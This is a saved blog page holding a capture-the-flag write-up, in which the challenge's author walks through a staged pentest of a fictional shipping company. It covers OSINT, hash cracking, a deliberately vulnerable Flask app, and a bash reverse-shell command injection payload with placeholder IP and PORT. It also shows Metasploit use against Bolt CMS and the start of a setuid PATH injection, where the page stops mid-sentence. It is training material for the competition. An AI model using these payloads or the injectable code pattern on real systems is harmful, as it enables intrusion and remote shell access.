<!doctype html> <html lang="en-US"> <head>     <meta charset="UTF-8">     <meta name="viewport" content="width=device-width, initial-scale=1">     <link rel="profile" href="https://gmpg.org/xfn/11">  	<title>De Danske Cybermesterskaber Nationals &#8211; Operation Hvid Sandhed &#8211; 0xlimE Writeup blog</title> <meta name='robots' content='max-image-preview:large' /> <link rel='dns-prefetch' href='//s.w.org' /> <link href='https://fonts.gstatic.com' crossorigin rel='preconnect' /> <link rel="alternate" type="application/rss+xml" title="0xlimE Writeup blog &raquo; Feed" href="https://0xli.me/?feed=rss2" /> <link rel="alternate" type="application/rss+xml" title="0xlimE Writeup blog &raquo; Comments Feed" href="https://0xli.me/?feed=comments-rss2" /> 		<script>
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/0xli.me\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.2"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script> 		<style> img.wp-smiley, img.emoji { 	display: inline !important; 	border: none !important; 	box-shadow: none !important; 	height: 1em !important; 	width: 1em !important; 	margin: 0 .07em !important; 	vertical-align: -0.1em !important; 	background: none !important; 	padding: 0 !important; } </style> 	<link rel='stylesheet' id='wp-block-library-css'  href='./css/dist-block-library-style.min.css' media='all' /> <link rel='stylesheet' id='wp_meliora-style-css'  href='./css/wp-meliora-style.css' media='all' /> <link rel='stylesheet' id='dashicons-css'  href='./css/npz-dashicons.min.css' media='all' /> <link rel='stylesheet' id='enlighterjs-css'  href='./css/enlighter-cache-enlighterjs.min.css' media='all' />         <script>
            /* <![CDATA[ */
            var rcewpp = {
                "ajax_url":"https://0xli.me/wp-admin/admin-ajax.php",
                "nonce": "34564bfd5b",
                "home_url": "https://0xli.me/",
                "settings_icon": 'https://0xli.me/wp-content/plugins/export-wp-page-to-static-html/admin/images/settings.png',
                "settings_hover_icon": 'https://0xli.me/wp-content/plugins/export-wp-page-to-static-html/admin/images/settings_hover.png'
            };
            /* ]]\> */
        </script>         <link rel="https://api.w.org/" href="https://0xli.me/index.php?rest_route=/" /><link rel="alternate" type="application/json" href="https://0xli.me/index.php?rest_route=/wp/v2/pages/725" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://0xli.me/xmlrpc.php?rsd" /> <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://0xli.me/wp-includes/wlwmanifest.xml" />  <meta name="generator" content="WordPress 5.8.2" /> <link rel="canonical" href="https://0xli.me/?page_id=725" /> <link rel='shortlink' href='https://0xli.me/?p=725' /> <link rel="alternate" type="application/json+oembed" href="https://0xli.me/index.php?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2F0xli.me%2F%3Fpage_id%3D725" /> <link rel="alternate" type="text/xml+oembed" href="https://0xli.me/index.php?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=https%3A%2F%2F0xli.me%2F%3Fpage_id%3D725&#038;format=xml" />     <style>         :root {	 	            --wp-meliora-primary-color: #FFBA9D; 	            --wp-meliora-base-font-color: #777777; 	            --wp-meliora-heading-color: #474747; 	             	            --wp-meliora-link-normal-color: #000 ; 	            --wp-meliora-link-hover-color: #FFBA9D ; 			}    </style> 	<style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><link rel="icon" href="./images/limewirelogo-96x96.png" sizes="32x32" /> <link rel="icon" href="./images/limewirelogo-300x300.png" sizes="192x192" /> <link rel="apple-touch-icon" href="https://0xli.me/wp-content/uploads/2021/01/limewirelogo-300x300.png" /> <meta name="msapplication-TileImage" content="https://0xli.me/wp-content/uploads/2021/01/limewirelogo-300x300.png" /> 		<style id="wp-custom-css"> 			.wp-block-image img {     max-width: 100%;     margin-left: auto;     margin-right: auto;     display: block; 		margin-bottom 0px; 		 } .wp-block-image figcaption {     margin-top: 0em; } figure figcaption {     text-align: center; 		font-size: 14px; 		font-weight: lighter; 		color: grey; } code, kbd, samp{ 	color: darkgreen; } 		</style> 		<style id="kirki-inline-styles">.h1,h1{font-family:Roboto Mono;font-size:24px;font-weight:300;line-height:1.5;}.h2,h2{font-size:calc(24px - 0.3125rem);font-weight:300;font-family:Roboto Mono;line-height:1.5;}.h3,h3{font-size:calc(24px - 0.38rem);font-weight:300;font-family:Roboto Mono;}.h4,h4{font-size:calc(24px - 0.44rem);font-weight:300;font-family:Roboto Mono;}.h5,h5{font-size:calc(24px - 0.52rem);font-weight:300;font-family:Roboto Mono;}.h6,h6{font-size:calc(24px - 0.6rem);font-weight:300;font-family:Roboto Mono;}body{font-size:16px;line-height:1.5;font-family:Roboto Mono;}.c-post__content__main a{font-family:Roboto Mono;font-size:16px;font-weight:300;line-height:1.5;}/* cyrillic-ext */ @font-face {   font-family: 'Roboto Mono';   font-style: normal;   font-weight: 300;   font-display: swap;   src: url(./fonts/L0xuDF4xlVMF-BfR8bXMIhJHg45mwgGEFl0_gPq_SeW-AJi8SKQuQ4Y.woff) format('woff');   unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; } /* cyrillic */ @font-face {   font-family: 'Roboto Mono';   font-style: normal;   font-weight: 300;   font-display: swap;   src: url(./fonts/L0xuDF4xlVMF-BfR8bXMIhJHg45mwgGEFl0_gPq_QOW-AJi8SKQuQ4Y.woff) format('woff');   unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116; } /* greek */ @font-face {   font-family: 'Roboto Mono';   font-style: normal;   font-weight: 300;   font-display: swap;   src: url(./fonts/L0xuDF4xlVMF-BfR8bXMIhJHg45mwgGEFl0_gPq_R-W-AJi8SKQuQ4Y.woff) format('woff');   unicode-range: U+0370-03FF; } /* vietnamese */ @font-face {   font-family: 'Roboto Mono';   font-style: normal;   font-weight: 300;   font-display: swap;   src: url(./fonts/L0xuDF4xlVMF-BfR8bXMIhJHg45mwgGEFl0_gPq_S-W-AJi8SKQuQ4Y.woff) format('woff');   unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB; } /* latin-ext */ @font-face {   font-family: 'Roboto Mono';   font-style: normal;   font-weight: 300;   font-display: swap;   src: url(./fonts/L0xuDF4xlVMF-BfR8bXMIhJHg45mwgGEFl0_gPq_SuW-AJi8SKQuQ4Y.woff) format('woff');   unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; } /* latin */ @font-face {   font-family: 'Roboto Mono';   font-style: normal;   font-weight: 300;   font-display: swap;   src: url(./fonts/L0xuDF4xlVMF-BfR8bXMIhJHg45mwgGEFl0_gPq_ROW-AJi8SKQu.woff) format('woff');   unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }</style></head>  <body class="page-template-default page page-id-725 no-sidebar"> <div id="page" class="o-page site is-content-sidebar">     <a class="skip-link screen-reader-text" href="#primary">Skip to content</a>     <header id="masthead" class="c-header site-header">         <div class="c-header__main u-default-max-width">             <div class="c-header__branding"> 				            <p class="c-header__branding__title site-title h1">                 <a class="c-header__branding__title__link h1" href="https://0xli.me/" rel="home">0xlimE Writeup blog</a>             </p> 		            </div><!-- .site-branding -->              <nav id="site-navigation" class="c-header__navigation main-navigation">                 <button aria-label="Toggle menu" class="c-header__navigation__toggle js-menu-toggle menu-toggle" aria-controls="primary-menu" aria-expanded="false">                     <span class="dashicons dashicons-menu-alt"></span></button> 				<ul id="primary-menu" class="menu js-primary-menu"><li class='menu-item menu-item-type-custom menu-item-object-custom menu-item-home'><a href="https://0xli.me">Home</a></li> <li class='menu-item menu-item-type-post_type menu-item-object-page'><a href="https://0xli.me/?page_id=427">Passwords</a></li> <li class='menu-item menu-item-type-taxonomy menu-item-object-category'><a href="https://0xli.me/?cat=23">HTB Machines</a></li> <li class='menu-item menu-item-type-taxonomy menu-item-object-category'><a href="https://0xli.me/?cat=24">HTB Challenges</a></li> <li class='menu-item menu-item-type-taxonomy menu-item-object-category'><a href="https://0xli.me/?cat=34">CTF</a></li> </ul>            </nav><!-- #site-navigation --> 			        </div>     </header><!-- #masthead -->      <main id="primary" class="site-main">         <div class="site-main__container default-max-width">             <div class="site-main__content"> 				 <article id="post-725" class="c-page post-725 page type-page status-publish hentry">      <header class="c-page__header entry-header"> 		<h1 class="c-page__title entry-title">De Danske Cybermesterskaber Nationals &#8211; Operation Hvid Sandhed</h1>    </header><!-- .entry-header -->      <div class="entry-content"> 		 <p>I made the 6 part pentest challenge Operation Hvid Sandhed for DDC Nationals. This is a writeup on the intended way to solve it.</p>    <p>The challenge had 6 flags, in the journals of our antagonist <code>Henrik Floppergaard</code></p>    <ul><li><strong>Dagbog 0</strong>. This was in the source code of the webserver <code>http://fastfloppershipping.hkn</code></li><li><strong>Dagbog 1. </strong>This was on the FTP server, along with the source code to the main webserver. Access could be found by doing OSINT work and cracking a hash, or finding the credentials on a notepad found with OSINT work.</li><li><strong>Dagbog 2. </strong>This was found after getting RCE on the webserver with command injection.</li><li><strong>Dagbog 3</strong>. This was found in the root directory of the web server, which you could escalate to by cracking a KeepassX file password and accessing the password manager.</li><li><strong>Dagbog 4. </strong> This was found after getting credentials to log into Bolt CMS on <code>http://bolt.fastfloppershipping.hkn</code>. The bolt cms was vulnerable to a <code>CVE </code>which would provide <code>RCE</code>.</li><li><strong>Dagbog 5. </strong>This was found after getting root user on the bolt cms webserver, this could be done by exploiting <em>Path injection</em> in a setuid binary on the bolt cms server.</li></ul>    <p>This is the rough sketch, I will now go deeper into the details on how to solve this challenge.</p>    <h2>Initial enumeration</h2>    <p>We are presented with information that we need to hack the company <code>Fastflopper Shipping</code> and are given 3 domains:</p>    <ul><li><code>fastfloppershipping.hkn</code></li><li><code>bolt.fastfloppershipping.hkn</code></li><li><code>ftp.fastfloppershipping.hkn</code></li></ul>    <p>My first thought here, were I to solve it, would be to try and check for <code>anonymous login</code> so I could maybe get a peek into some sensitive files.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="1225" height="322" src="./images/billede-3.png" alt="" class="wp-image-730"/><figcaption>Trying to log in with anonymous access</figcaption></figure>    <p>But we see that anonymous access is not allowed, I could start bruteforcing logins here, but I think it is better to leave it for now. However always try the lowest hanging fruit first.</p>    <p>Next I go to the main site and try and navigate around and see what I can find. </p>    <p>First thing to notice is we have some social media accounts from the people working there.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="1187" height="517" src="./images/billede-4.png" alt="" class="wp-image-731"/><figcaption>Hovering these images will show links to social media profiles (except for Trine and You)</figcaption></figure>    <p>The links we have:</p>    <h2>Henrik Floppergaard</h2>    <ul><li>Facebook: <code>https://www.facebook.com/henrik.floppergaard.3</code></li><li>Linkedin: <code>https://www.linkedin.com/in/henrik-floppergaard-353a23207/</code></li><li>Twitter: <code>https://twitter.com/floppergaard </code></li></ul>    <h2>Alberte Floppergaard</h2>    <ul><li>Instagram: <code>https://www.instagram.com/floppergaard/</code></li></ul>    <p>Along with the social media accounts, we have a contact form in the end, where we can put in a company name and a message, however with all random company names I try, it will just give me an error.</p>    <figure class="wp-block-image size-large"><img loading="lazy" width="588" height="425" src="./images/billede-5.png" alt="" class="wp-image-732"/><figcaption>Cant find the company in the contact form</figcaption></figure>    <p>If we view the source of the site, we find the first journal! Dagbog 0</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="745" height="375" src="./images/billede-15.png" alt="" class="wp-image-742"/><figcaption>We find the first Dagbog!</figcaption></figure>    <p class="has-text-align-center has-large-font-size"><code>Dagbog-0 : DDC{D3r_3R_uGL3r_1_m053n_f1Nd_uD_4f_hV4d_Fl0pp3rG44rD_5kJul3R}</code></p>    <hr class="wp-block-separator"/>    <p>Ok so let us move on and wait with looking on social media accounts, and instead look at the last domain <code>bolt.fastfloppershipping.hkn</code>.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="1397" height="883" src="./images/billede-6.png" alt="" class="wp-image-733"/><figcaption>http://bolt.fastfloppershipping.hkn</figcaption></figure>    <p>So this says it is bolt cms, if we research that we see that it is some open source cms system (<code>https://github.com/bolt/bolt</code>) and by researching we can get to the admin login page by going to <code>/bolt</code></p>    <figure class="wp-block-image size-full"><img loading="lazy" width="738" height="700" src="./images/billede-7.png" alt="" class="wp-image-734"/><figcaption>What we see on http://bolt.fastfloppershipping.hkn/bolt</figcaption></figure>    <p>So I try default credentials, but I cannot log in, time to go back and look at what I have to look at. My next idea is to look for directories on the main server, but I first want to check social media profiles for hints at login credentials. So we go to investigate <em>Henrik Floppergaard</em>.</p>    <p>His Linkedin Profile is pretty non saying, just that he is CEO of the company.</p>    <figure class="wp-block-image size-full is-resized"><img loading="lazy" src="./images/billede-8.png" alt="" class="wp-image-735" width="705" height="1012"/><figcaption>Very blank linkedin</figcaption></figure>    <p>The next I would like to look at is his facebook, which is wide open, lets check that out.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="843" height="1277" src="./images/billede-9.png" alt="" class="wp-image-736"/><figcaption>Henrik Floppergaard&#8217;s Facebook profile</figcaption></figure>    <p>Here we get some nice information which may prove useful, he is working with his daughter Alberte, who is born 7th of march 1993, this is worth noting down. Other than that there is only a small joke and a reference to contact him. Let us jump to his twitter!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="605" height="1302" src="./images/billede-10.png" alt="" class="wp-image-737"/><figcaption>Twitter of Henrik Floppergaard</figcaption></figure>    <p>So we get some more info here that is good, we understand that he was previously hacked by some hackers! He has also uploaded a picture of a mail that he got, where an attacker sends that they have stolen some of his files by hacking his ftp and provided his login username and what seems to be a long hex string. Lets extract that (tedious).</p>    <p><code>2C832801CFF718EE4838A84D22D44313</code></p>    <p>Since this was put next to the password, my best guess is that this is a hash, that Henrik doesn&#8217;t know what is, you can also see that he is saying that this is not even his password! This definitely looks like <code>md5</code> but let us hash analyze it.</p>    <figure class="wp-block-image size-large"><img loading="lazy" width="896" height="780" src="./images/billede-11.png" alt="" class="wp-image-738"/><figcaption>https://www.tunnelsup.com/hash-analyzer/ tells us it is MD5</figcaption></figure>    <p>Ok, so we can run some cracking tools in the background, I can start up john the ripper or hashcat with <code>rockyou.txt</code> but we don&#8217;t get a hit, too bad! Let us look at Albertes instagram.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="994" height="1326" src="./images/billede-12.png" alt="" class="wp-image-739"/><figcaption>Alberte Floppergaards instagram</figcaption></figure>    <p> From her posts, we can see that she does work with her dad, and that they are earning a lot of money in the shipping industry.</p>    <p>From here, there were 2 ways of moving on, and I know a lot of people struggled here. </p>    <p>The first way is to look at Albertes post with the <em>post-its</em>, here we see she accidentally uploaded the ftp credentials!!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="809" height="593" src="./images/billede-13.png" alt="" class="wp-image-740"/><figcaption>We find ftp credentials; <code>floppergaard:Alberte1993</code></figcaption></figure>    <p>The second way, would be to make a custom wordlist, with what we know about Henrik Floppergaard, namely that his daughter is born in 1993. It would make sense to create a wordlist on what you know about him and check the wordlist with hashcat or john, then the hash that we found earlier would be cracked.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="403" height="167" src="./images/billede-14.png" alt="" class="wp-image-741"/><figcaption>So you could also have cracked the hash.</figcaption></figure>    <p>This was a little tedious to find out, I think a general hint is that if you find pictures with post-its on them on social media, its worth looking through.</p>    <hr class="wp-block-separator"/>    <p>Ok so let us move on and try to connect to the FTP server.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="792" height="694" src="./images/image.png" alt="" class="wp-image-745"/><figcaption>Connecting to the ftp server, if you cannot get it to respond back and you get errors, try using passive mode (pas)</figcaption></figure>    <p>Ok so we see a backup of the webserver, and Dagbog 1. Let us read it.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="1210" height="323" src="./images/image-1.png" alt="" class="wp-image-746"/><figcaption>We see that Henrik is starting some side business that is less legal.</figcaption></figure>    <p class="has-text-align-center has-large-font-size"><code>Dagbog-1 : DDC{Fl0pp3rG44rd5_5v4g3_p455w0rd_cr4Ck3t_m3d_0s1nt}</code></p>    <hr class="wp-block-separator"/>    <p>Other than the Dagbog, we also get a copy of the webserver, lets look at it, its a flask application.</p>    <pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import click, functools, os, hashlib,time, random, sys from flask import Flask, current_app, g, session, redirect, render_template, url_for, request   ### APPLICATION SETUP ### app = Flask(__name__, template_folder="dist", static_folder="dist", static_url_path="") app.secret_key = os.urandom(32) clientHashes = []  ### HELPERS ### def loadClients():     f = open("clients.txt","rb")     for l in f.readlines():         line = l.strip()         clientHashes.append(hashlib.sha256(line).hexdigest())   def writeToFile(text):     #Is this the best way to do it? I don't know.     command = """echo 'Ny besked fra Hvidmink Pharma, se gerne:  %s ' >> ClientMessages.txt""" % text     os.system(command)  @app.route("/", methods=('GET', 'POST')) def index():     companyOutput = ""     textOutput = ""     if request.method == 'POST':         company = request.form['company']         freetext = request.form['freetext']         print(company)         companyhash = hashlib.sha256(company.encode()).hexdigest()         print(companyhash)         if(companyhash == '98dd08eb2bf8035634859e35a0e4d06d690bf18bd55a63fd908a67731186184e'):             companyOutput="Vi tager os af jer, VIP kunde."             writeToFile(freetext)         elif(companyhash in clientHashes):             companyOutput="Vi gør hvad vi kan gøre for at klare jeres sag."             #Todo, håndter de andre kunder, men de er ikke så vigtige lige nu.         else:             companyOutput="Virksomhed ikke i vores database."         return render_template('index.html/',companyError=companyOutput,otherError=textOutput,scroll="contact")     else:         return render_template('index.html',companyError=companyOutput,otherError=textOutput)      if __name__ == "__main__":     #Get client names.          runport = 5000     if(len(sys.argv)==2):         runport = sys.argv[1]     try:         loadClients()         app.run(host='0.0.0.0', port=runport) # runs on machine ip address to make it visible on netowrk     except:         print("Something went wrong. the usage of the server is either")         print("'python3 app.py' (to start on port 5000)")         print("or")         print("'sudo python3 app.py 80' (to run on any other port)")</pre>    <p>This is a very simple app, with a few special functionalities.</p>    <ol><li>The app opens a file, clients.txt and reads every line which is hashed with sha256 and put into a list. We have found this client.txt also and its just a list of odd companies.</li><li>The app will, when prompted to handle a POST request, look for a company name and a message, this is the <em>Contact</em> formula in the bottom of the page. </li><li>If the company submitted, hashed, matches a specific hash, we will handle the message, otherwise we will just give an error message back.</li><li>If the hash of the input company matches <code>98dd08eb2bf8035634859e3....</code> we will run the function <code>writeToFile()</code></li></ol>    <p>So when we go through the list of companies, we can spot a company <em>Hvidmink Pharma</em> which will provide the needed hash.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="686" height="69" src="./images/image-2.png" alt="" class="wp-image-748"/><figcaption>Hvidmink Pharma is the needed company. BTW Pro tip, never use echo to pipe a string into <code>sha256sum</code> or <code>md5sum</code> since echo also makes a newline, which will give you a wrong hash then.</figcaption></figure>    <p>The most interesting part here is definitely the <code>writeToFile()</code>function, which is vulnerable to <code>Command Injection</code>. What this function does, is call <code>os.system()</code>, which is a crazy unsafe operation, since the string content will be piped straight into bash. Since we control the direct flow of information to the function, and there is no sanitization, we can get code execution from some manual escaping.</p>    <p class="has-text-align-center has-medium-font-size">&#8220;<code>echo 'Ny besked fra Hvidmink Pharma, se gerne: (WE CONTROL THIS PART) ' >> ClientMessages.txt</code>&#8220;</p>    <p>As you can see above, we have some control inside a terminal, our strategy now is to.</p>    <ol><li>First escape the string we are echoing, our payload is then: <code>'</code></li><li>End the command in bash and execute a new one, our payload is then: <code>';</code></li><li>Inject a command that will do something malicious, I will be going for a bash reverse shell, wrapped in a bash -c call, see this link: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a>, our payload is then: <code>';bash -c "bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1"</code></li><li>Lastly, there is still some code to the right of our payload, let us just comment it out with a hashtag, our final payload is now: <code>';bash -c "bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1" #</code></li><li>Of course we need to change IP and PORT</li></ol>    <p>A small tip, is if you bash reverse shell is not working, to wrap it in a <code>bash -c</code> call, I&#8217;m not entirely sure why this is a good tip, but I have found it work often.</p>    <p>If we put in the company; <em>Hvidmink Pharma</em> and the payload above, and start a <code>netcat listener</code> we will get a shell!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="1137" height="748" src="./images/Animation.gif" alt="" class="wp-image-750"/><figcaption>Moving to Kali and getting shell as <em>Henrik</em></figcaption></figure>    <p>And we are on the machine as user Henrik! If we look around we may find some nice stuff, but first lets upgrade our shell with the following command to get a better tty: <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="710" height="264" src="./images/tty.gif" alt="" class="wp-image-752"/><figcaption>Upgrading your shell is good practice, otherwise you may run into some bugs and problems, shout out to oxnan who was fighting his TTY for a long time.</figcaption></figure>    <p>And we see the Dagbog-2</p>    <figure class="wp-block-image size-large"><img loading="lazy" width="822" height="332" src="./images/image-9.png" alt="" class="wp-image-760"/></figure>    <p class="has-text-align-center has-large-font-size"><code>Dagbog-2 : DDC{C0mm4nD_1nj3ct10n_g1v3r_d1g_4dg4ng_t1l_Fl0pp3rG44rd5_w3bS3rv3r}</code></p>    <hr class="wp-block-separator"/>    <p>Alright, so lets look around, a good thing to do is always to see which users are on the machine.</p>    <figure class="wp-block-image size-full is-resized"><img loading="lazy" src="./images/image-3.png" alt="" class="wp-image-753" width="819" height="437"/><figcaption>No interesting users other than Henrik</figcaption></figure>    <p>Ok so nothing interesting, lets look in Henriks Home dir.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="821" height="263" src="./images/image-4.png" alt="" class="wp-image-754"/><figcaption>Henriks Home dir</figcaption></figure>    <p>Ok so we have just 1 file, but a very interesting one a <code>.kdbx</code> file belonging to <em>root</em>.. <code>.kdbx</code> is a format for KeePassX password manager. Lets transfer it to our machine and try to open it.</p>    <blockquote class="wp-block-quote"><p>A nice tip to transfer files that are not so large, is to simply base64 encode them, copy the output  to clipboard and then base64 decode them from the clipboard on the local machine. This works if files are relatively small. With larger files you can use netcat if you like me try to avoid meterpreter.</p></blockquote>    <figure class="wp-block-image size-large"><img loading="lazy" width="803" height="435" src="./images/image-5.png" alt="" class="wp-image-756"/><figcaption>Trying to open the password manager file in keepassx</figcaption></figure>    <p>Naturally the password manager file is password protected, so lets try and crack the password with <em>John The Ripper. </em> There is a wide variety of <code>xyz2john.py</code> scripts which convert known password protected file formats to <em>John The Ripper</em> crackable hashes, in our situation we can use <code>keepass2john.py</code>.</p>    <figure class="wp-block-image size-large"><img loading="lazy" width="794" height="239" src="./images/image-6.png" alt="" class="wp-image-757"/><figcaption>Getting the hash to crack</figcaption></figure>    <p>After a little while, the hash cracks to the password; <code>asdfghjkl</code> let us try to use it!</p>    <figure class="wp-block-image size-large"><img loading="lazy" width="795" height="587" src="./images/image-7.png" alt="" class="wp-image-758"/><figcaption>We open the password manager and see that we get root credentials!</figcaption></figure>    <p>We get a new password for the root user, namely: <code>fj302rj90aimfCXZXC1!1235</code>, so we can try to escelate to the <em>root</em> user by calling <code>su root</code> as <em>Henrik</em> and then checking out the root directory!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="817" height="465" src="./images/image-8.png" alt="" class="wp-image-759"/><figcaption>We get Dagbog-3 and credentials for the Bolt CMS!</figcaption></figure>    <p class="has-text-align-center has-large-font-size"><code>Dagbog-3 : DDC{M45t3R_p455w0rD_sk4l_v43r3_s1kk3rt_g0r_1kk3_50m_fl0pP3rG44rd}</code></p>    <hr class="wp-block-separator"/>    <p>We naturally know where to go now, to <code>bolt.fastfloppershipping.hkn</code>, we still have 2 more journals to find, so we assume they are there. Let us go back to the login page we found earlier and put in <code>trine:taarnetkommer123</code> and log in!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="465" height="363" src="./images/image-10.png" alt="" class="wp-image-762"/><figcaption>We are logged in!</figcaption></figure>    <p>We are now logged in, here I am sure many looked around for a bit, but there really is not much to get, however in the bottom left corner the bolt CMS version is exposed, namely 3.7.0, lets try and search for this!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="887" height="811" src="./images/image-11.png" alt="" class="wp-image-763"/><figcaption>Bolt cms has multiple vulnerabilities, most importantly a RCE as authenticated</figcaption></figure>    <p>So we have a bolt Authenticated Bolt CMS RCE, and we are authenticated, let is exploit this, there are multiple POC scripts out there, I saw quite a few people struggling because they lost their shell and then couldnt replicate the exploit, this is because they were using a script that changed Trine&#8217;s password, its always a good idea to look into how the script works. For this case I will be using metasploit. So fire up msfvenom fellow skiddies!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="810" height="596" src="./images/msfconsole.gif" alt="" class="wp-image-764"/><figcaption>I love starting metasploit, I feel very 1337</figcaption></figure>    <p>here we can just search for bolt and find the exploit, its in the folder: <code>exploit/unix/webapp/bolt_authenticated_rce</code> so lets just use that, and set the correct options.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="1202" height="868" src="./images/image-12.png" alt="" class="wp-image-765"/><figcaption>Using metasploit is super easy</figcaption></figure>    <p>Pop in the options like above, and just type <code>run</code></p>    <figure class="wp-block-image size-full"><img loading="lazy" width="1199" height="867" src="./images/rce.gif" alt="" class="wp-image-766"/><figcaption>Getting code execution</figcaption></figure>    <p>Ok so we are on a new machine, as the user <em>www-data</em>! Let us first upgrade our shell then take a look around!</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="767" height="494" src="./images/image-13.png" alt="" class="wp-image-768"/><figcaption>Only 1 user again, <em>Trine</em></figcaption></figure>    <p>Ok so we see 1 user, it is <em>Trine</em>, let us go and check out her home directory if we can see her home directory!</p>    <figure class="wp-block-image size-large"><img loading="lazy" width="768" height="498" src="./images/image-14.png" alt="" class="wp-image-769"/><figcaption>Trines home directory leads us to Dagbog 4</figcaption></figure>    <p>So we get a peek into Henriks life, he is expanding his criminal empire with the mafia, he is also mentioning the most sensitive documents are in the root folder, which are well protected and backed up!</p>    <p class="has-text-align-center has-large-font-size"><code>Dagbog-4 : DDC{D3t_v1gt1g5t_4t_h0ld3_d1N_s0ftw4r3_upd4T3D_f0R_4t_1kk3_bl1v3_pWn3T}</code></p>    <hr class="wp-block-separator"/>    <p>Okay so we find a clue to the next part, it is that they are using a backup script! It is in <em>Trines</em> home folder and has the setuid bit set, this means that it will run as root user, let us see if it is exploitable, if it was a bigger script I would pop it into ghidra, but lets start by just baby reversing it by calling strings on it.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="571" height="434" src="./images/image-15.png" alt="" class="wp-image-770"/><figcaption>Calling strings on the binary gives us a peek into how it works.</figcaption></figure>    <p>It seems that it calls some bash functions, namely <code>mv</code> and <code>echo</code>, let us just check it out real quick in ghidra to confirm.</p>    <figure class="wp-block-image size-full"><img loading="lazy" width="639" height="262" src="./images/image-16.png" alt="" class="wp-image-771"/><figcaption>The decompiled main function of the backup binary</figcaption></figure>    <p>Yes, very clearly the binary is setuid and runs the <code>mv</code> command and just straight up takes the database out of the bolt cms system, as I am writing this I realize that this should have of course been <code>cp</code> and not <code>mv</code>. LOL</p>    <p>Anyway, the big vulnerability here, is mixing <code>setuid</code> with <code>binaries with relative paths</code>. This allows for us to do <code>path injection</code>.  Before exploiting, just a quick lesson on the variable <code>$PATH </code>in bash.</p>    <p>When you type in stuff like <code>echo</code>, 